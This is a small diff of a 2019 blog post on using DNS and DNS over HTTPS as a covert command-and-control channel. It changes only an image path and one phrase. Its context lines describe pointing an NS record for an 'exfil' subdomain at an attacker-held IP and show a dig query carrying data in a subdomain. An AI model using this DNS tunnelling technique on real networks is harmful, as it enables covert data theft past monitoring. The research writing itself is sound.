@@ -8,7 +8,7 @@ _**Aug 26, 2019**_
 
 [DNS over HTTPS](https://en.wikipedia.org/wiki/DNS_over_HTTPS) is cool. It aims to increase user privacy and security by moving [Domain Name System](https://en.wikipedia.org/wiki/Domain_Name_System) resolution from the old, unauthenticated UDP protocol to [HTTPS](https://en.wikipedia.org/wiki/HTTPS) and [HTTP/2](https://en.wikipedia.org/wiki/HTTP/2) 😇.. but are you aware that it can be used as a C2 communication channel? 😼
 
-![Dashboard](../assets/images/doh-proxy-dashboard.png "Dashboard")
+![Dashboard](../assets/images/network-flow.png "Dashboard")
 
 ## Domain Name System
 
@@ -59,7 +59,7 @@ For more information about the DNS protocol, you can check these articles:
 
 ## DNS as C2 Channel
 
-If we set up a NS record for `exfil.iwantmore.pizza` pointing to an IP that we control and we try to resolve a subdomain like this:
+If we set up a NS record for `exfil.iwantmore.pizza` pointing to an IP address that we control and we try to resolve a subdomain like this:
 
 ```bash
 root@kali:~$ dig 1234567890.exfil.iwantmore.pizza
